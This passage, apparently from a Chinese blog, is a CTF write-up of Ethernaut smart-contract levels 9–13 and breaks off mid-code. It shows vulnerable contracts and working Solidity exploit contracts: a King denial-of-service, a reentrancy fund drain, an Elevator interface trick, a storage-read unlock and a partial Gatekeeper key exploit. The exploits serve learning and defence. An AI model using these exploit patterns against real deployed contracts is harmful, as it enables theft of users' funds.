<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">6</span>]: w3.eth.get_storage_at(addr,<span class="number">0</span>)</span><br><span class="line">Out[<span class="number">6</span>]: HexBytes(<span class="string">'0x0000000000000000000000000000000000000000000000000000000000000000'</span>)</span><br></pre></td></tr></table></figure>
<h1 id="Level-9-King"><a href="#Level-9-King" class="headerlink" title="Level 9. King"></a>Level 9. King</h1><blockquote>
<p>The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD</p>
<p>Such a fun game. Your goal is to break it.</p>
<p>When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.</p>
</blockquote>
<h2 id="Source-3"><a href="#Source-3" class="headerlink" title="Source"></a>Source</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>() public payable &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external payable &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">_king</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">address payable</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没看懂题目是啥意思，我的目标是什么，看了<a href="https://cloud.tencent.com/developer/article/1632036" target="_blank" rel="noopener">wp</a></p>
<p>注意到owner变量是不会改变的，所以说owner总是可以重新取回king的身份，目标是成为king并且保持king的身份。</p>
<blockquote>
<p>The transfer function fails if the balance of the current contract is not large enough or if the Ether transfer is rejected by the receiving account. The transfer function reverts on failure.</p>
</blockquote>
<p>transfer在失败的时候会回滚，所以只要我们不接受transfer就可以阻值代码的继续执行。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: GPL-3.0</span></span><br><span class="line"></span><br><span class="line">pragma solidity &gt;<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Hacker &#123;</span><br><span class="line">    <span class="keyword">constructor</span>() payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(address(<span class="keyword">this</span>).balance == <span class="number">1</span> ether, <span class="string">"please give 1 ether"</span>);</span><br><span class="line">        address target = <span class="number">0xAc3c199067eB0Cb9a27A8230A1447865F35b4Ff6</span>;</span><br><span class="line">        (bool _res,) = target.call&#123;<span class="attr">value</span>: <span class="number">1</span> ether&#125;(abi.encode(<span class="string">""</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Level-10-Re-entrancy"><a href="#Level-10-Re-entrancy" class="headerlink" title="Level 10. Re-entrancy"></a>Level 10. Re-entrancy</h1><blockquote>
<p>The goal of this level is for you to steal all the funds from the contract.</p>
<p>Things that might help:</p>
<blockquote>
<p>Untrusted contracts can execute code where you least expect it.<br>Fallback methods<br>Throw/revert bubbling<br>Sometimes the best way to attack a contract is with another contract.<br>See the Help page above, section “Beyond the console”  </p>
</blockquote>
</blockquote>
<h2 id="Source-4"><a href="#Source-4" class="headerlink" title="Source"></a>Source</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'@openzeppelin/contracts/math/SafeMath.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">donate</span>(<span class="params">address _to</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _who</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint balance</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint _amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      (bool result, bytes memory data) = msg.sender.call.value(_amount)(<span class="string">""</span>);</span><br><span class="line">      <span class="keyword">if</span>(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>target: <code>0x22778878428C001234BC0d9A708D9664045d80BC</code></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>Originally, there was 1 ether in the contract, so our goal is to transfer this 1 ether back to our account.</p>
<p><a href="https://ethereum.stackexchange.com/questions/19341/address-send-vs-address-transfer-best-practice-usage" target="_blank" rel="noopener"><code>address.transfer</code> is safe</a> as it has a gas stipend of 2300. but <code>address.call.value().gas()()</code> forwards all available gas (adjustable), and is not safe against reentrancy. Here is <a href="https://medium.com/daox/three-methods-to-transfer-funds-in-ethereum-by-means-of-solidity-5719944ed6e9" target="_blank" rel="noopener">another reading.</a></p>
<p>奥，我明白了，我总是试图在constructor函数中就完成整个exp链的构造，但是在这个时候我的各个编写的函数是还不存在的，我的fallack函数也不存在。所以这一题要利用fallback函数的话是不能够在一个constructor函数中就完成的，必须要在整个合约部署完成之后，再发起第二笔交易来进行攻击。所以说这题至少也需要两笔交易完成攻击。</p>
<p>关于<a href="https://ethereum.stackexchange.com/questions/81994/what-is-the-receive-keyword-in-solidity" target="_blank" rel="noopener">receive关键字</a>。</p>
<p>值得注意的是即便被攻击合约中写的是<code>msg.sender.call.value(_amount)(&quot;&quot;);</code>，但是还是call了receive函数，也就是没有calldata。实验发现在fallback函数和receive函数同时存在的情况下会调用receive函数。</p>
<p>从<a href="https://ethervm.io/decompile/rinkeby/0x22778878428C001234BC0d9A708D9664045d80BC" target="_blank" rel="noopener">反编译结果</a>来看也是没有calldata。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> temp0 = memory[<span class="number">0x40</span>:<span class="number">0x60</span>];</span><br><span class="line">temp1, memory[temp0:temp0 + <span class="number">0x00</span>] = address(msg.sender).call.gas(msg.gas).value(arg0)(memory[temp0:temp0 + memory[<span class="number">0x40</span>:<span class="number">0x60</span>] - temp0]);</span><br></pre></td></tr></table></figure>
<p>由于这里<code>.call</code>函数只接受一个<code>bytes</code>参数，而<code>&quot;&quot;</code>又是长度为0，所以就没有calldata了。如果把长度变成8，就是这样：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(bool result, bytes memory data) = msg.sender.call.value(_amount)(<span class="string">"deadbeef"</span>);</span><br><span class="line"></span><br><span class="line">-----</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> temp1 = memory[<span class="number">0x40</span>:<span class="number">0x60</span>];</span><br><span class="line">temp2, memory[temp1:temp1 + <span class="number">0x00</span>] = address(msg.sender).call.gas(msg.gas).value(arg0)(memory[temp1:temp1 + (temp0 + <span class="number">0x08</span>) - temp1]);</span><br></pre></td></tr></table></figure>
<p>这是正常的行为，不是<a href="https://cn.etherscan.com/solcbuginfo?a=SkipEmptyStringLiteral" target="_blank" rel="noopener">编译器的bug</a>，这个bug在0.4.12就已经修复。</p>
<p><a href="https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/" target="_blank" rel="noopener">推荐使用call</a>而不再推荐使用transfer和send。自己防范重入。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: GPL-3.0</span></span><br><span class="line"></span><br><span class="line">pragma solidity &gt;=<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface Reentrance &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">donate</span>(<span class="params">address _to</span>) <span class="title">external</span> <span class="title">payable</span>;</span></span><br><span class="line"><span class="function">    <span class="title">function</span> <span class="title">withdraw</span>(<span class="params">uint _amount</span>) <span class="title">external</span>;</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">Hacker</span> </span>&#123;</span><br><span class="line">    address owner;</span><br><span class="line">    Reentrance target = Reentrance(<span class="number">0x22778878428C001234BC0d9A708D9664045d80BC</span>);</span><br><span class="line">    uint cnt = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">constructor</span>() payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.value == <span class="number">1</span> ether, <span class="string">"constructor(): Insufficient Fund."</span>);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier auth &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == owner, <span class="string">"auth(): Not Authenticated."</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        <span class="keyword">if</span> (cnt == <span class="number">0</span>) &#123;</span><br><span class="line">            cnt ++ ;</span><br><span class="line">            target.withdraw(<span class="number">10</span> ** <span class="number">18</span>);  <span class="comment">// 1 ether</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">auth</span> </span>&#123;</span><br><span class="line">        target.donate&#123;<span class="attr">value</span>: <span class="number">1</span> ether&#125;(address(<span class="keyword">this</span>));</span><br><span class="line">        target.withdraw(<span class="number">10</span> ** <span class="number">18</span>);  <span class="comment">// 1 ether</span></span><br><span class="line">        selfdestruct(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Use the <code>Checks-Effects-Interactions</code> Pattern</p>
<h1 id="Level-11-Elevator"><a href="#Level-11-Elevator" class="headerlink" title="Level 11. Elevator"></a>Level 11. Elevator</h1><blockquote>
<p>This elevator won’t let you reach the top of your building. Right?</p>
<p>Things that might help:</p>
<blockquote>
<p>Sometimes solidity is not good at keeping promises.<br>This Elevator expects to be used from a Building.</p>
</blockquote>
</blockquote>
<h2 id="Source-5"><a href="#Source-5" class="headerlink" title="Source"></a>Source</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">isLastFloor</span>(<span class="params">uint</span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">bool</span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">Elevator</span> </span>&#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">goTo</span>(<span class="params">uint _floor</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实现一个简单的接口</p>
<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: GPL-3.0</span></span><br><span class="line"></span><br><span class="line">pragma solidity &gt;=<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">isLastFloor</span>(<span class="params">uint</span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">bool</span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">interface</span> <span class="title">Elevator</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">goTo</span>(<span class="params">uint _floor</span>) <span class="title">external</span>;</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">Hacker</span> <span class="title">is</span> <span class="title">Building</span> </span>&#123;</span><br><span class="line">    address owner;</span><br><span class="line">    Elevator target = Elevator(<span class="number">0xaf6637c511207fe29A9eB0A11c869728380D505B</span>);</span><br><span class="line">    uint cnt = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">constructor</span>() payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier auth &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == owner, <span class="string">"auth(): Not Authenticated."</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isLastFloor</span>(<span class="params">uint floor</span>) <span class="title">external</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(floor &gt;= <span class="number">0</span>, <span class="string">"isLastFloor(): Cannot Failed."</span>);</span><br><span class="line">        <span class="keyword">if</span> (cnt == <span class="number">0</span>) &#123;</span><br><span class="line">            cnt ++ ;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">auth</span> </span>&#123;</span><br><span class="line">        target.goTo(<span class="number">2</span> ** <span class="number">256</span> - <span class="number">1</span>);</span><br><span class="line">        selfdestruct(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Level-12-Privacy"><a href="#Level-12-Privacy" class="headerlink" title="Level 12. Privacy"></a>Level 12. Privacy</h1><blockquote>
<p>The creator of this contract was careful enough to protect the sensitive areas of its storage.</p>
<p>Unlock this contract to beat the level.</p>
<p>Things that might help:</p>
<blockquote>
<p>Understanding how storage works<br>Understanding how parameter parsing works<br>Understanding how casting works</p>
</blockquote>
</blockquote>
<h2 id="Source-6"><a href="#Source-6" class="headerlink" title="Source"></a>Source</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked = <span class="literal">true</span>;                <span class="comment">// 0</span></span><br><span class="line">  uint256 public ID = block.timestamp;      <span class="comment">// 1</span></span><br><span class="line">  uint8 private flattening = <span class="number">10</span>;            <span class="comment">// 2_0_1</span></span><br><span class="line">  uint8 private denomination = <span class="number">255</span>;         <span class="comment">// 2_1_2</span></span><br><span class="line">  uint16 private awkwardness = uint16(now); <span class="comment">// 2_2_4</span></span><br><span class="line">  bytes32[<span class="number">3</span>] private data;                  <span class="comment">// 3 4 5</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(bytes32[3] memory _data) public &#123;</span><br><span class="line">    data = _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">unlock</span>(<span class="params">bytes16 _key</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(_key == bytes16(data[<span class="number">2</span>]));</span><br><span class="line">    locked = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    A bunch of super advanced solidity algorithms...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`</span></span><br><span class="line"><span class="comment">      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,</span></span><br><span class="line"><span class="comment">      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\</span></span><br><span class="line"><span class="comment">      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)</span></span><br><span class="line"><span class="comment">      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>链上没有隐私</p>
<p><img src="./11.png" alt></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.unlock(<span class="string">'0xc9e62529e16fdfb38db596273b2db912'</span>)</span><br></pre></td></tr></table></figure>
<p>这一关的<a href="https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925" target="_blank" rel="noopener">推荐阅读</a></p>
<h1 id="Level-13-Gatekeeper-One"><a href="#Level-13-Gatekeeper-One" class="headerlink" title="Level 13. Gatekeeper One"></a>Level 13. Gatekeeper One</h1><h2 id="Source-7"><a href="#Source-7" class="headerlink" title="Source"></a>Source</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'@openzeppelin/contracts/math/SafeMath.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    <span class="built_in">require</span>(gasleft().mod(<span class="number">8191</span>) == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      <span class="built_in">require</span>(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), <span class="string">"GatekeeperOne: invalid gateThree part one"</span>);</span><br><span class="line">      <span class="built_in">require</span>(uint32(uint64(_gateKey)) != uint64(_gateKey), <span class="string">"GatekeeperOne: invalid gateThree part two"</span>);</span><br><span class="line">      <span class="built_in">require</span>(uint32(uint64(_gateKey)) == uint16(tx.origin), <span class="string">"GatekeeperOne: invalid gateThree part three"</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">enter</span>(<span class="params">bytes8 _gateKey</span>) <span class="title">public</span> <span class="title">gateOne</span> <span class="title">gateTwo</span> <span class="title">gateThree</span>(<span class="params">_gateKey</span>) <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>require(gasleft().mod(8191) == 0);</code>这里我是有点懵的。如何测量走到这一步消耗了多少gas呢？</p>
<p><a href="https://hitcxy.com/2019/ethernaut/" target="_blank" rel="noopener">https://hitcxy.com/2019/ethernaut/</a></p>
<p><a href="https://www.cnblogs.com/x-poior/p/10511552.html#:~:text=%E5%9C%A8%20Solidity%20%E4%B8%AD%EF%BC%8Ccall%20%E5%87%BD%E6%95%B0%E7%B0%87%E5%8F%AF%E4%BB%A5%E5%AE%9E%E7%8E%B0%E8%B7%A8%E5%90%88%E7%BA%A6%E7%9A%84%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%8A%9F%E8%83%BD%EF%BC%8C%E5%85%B6%E4%B8%AD%E5%8C%85%E6%8B%AC%20call%E3%80%81delegatecall%20%E5%92%8C%20callcode%20%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F%E3%80%82,%3Caddress%3E.callcode%20%28...%29%20returns%20%28bool%29%20%3Caddress%3E.delegatecall%20%28...%29%20returns%20%28bool%29" target="_blank" rel="noopener">callcode操作符</a>是在自己的上下文中执行代码，但是msg.sender会发生改变。<a href="https://ethereum.stackexchange.com/questions/3667/difference-between-call-callcode-and-delegatecall" target="_blank" rel="noopener">ref</a></p>
<p>geth<a href="https://ethereum.stackexchange.com/questions/58108/opcodes-push-dup-and-swap" target="_blank" rel="noopener">自定义的opcodes</a></p>
<p>Istanbul Fork<a href="https://medium.com/mycrypto/ethereums-istanbul-fork-technical-explanation-48a3aef718b0" target="_blank" rel="noopener">新增的两个opcode</a></p>
<p>柏林升级前<a href="https://www.chainnews.com/articles/452289578010.htm" target="_blank" rel="noopener">移除 EIP-2315</a></p>
<p>观察gateThree要求的条件，要求倒数第2 3个字节是0，要求高4个字节不为0，要求倒数1 2个字节是tx.origin</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Hacker &#123;</span><br><span class="line">    </span><br><span class="line">    address target = <span class="number">0x8c0d72c453b11E7507C4AcAA339004De5b1Ee3Be</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        uint64 bts = <span class="number">0xffffffff00000000</span>;</span><br><span class="line">        bts += uint16(uint160(tx.origin));</span><br><span class="line">        bool res;</span><br><span class="line">        (res, ) = target.call&#123;<span class="attr">gas</span>:<span class="number">254</span>+<span 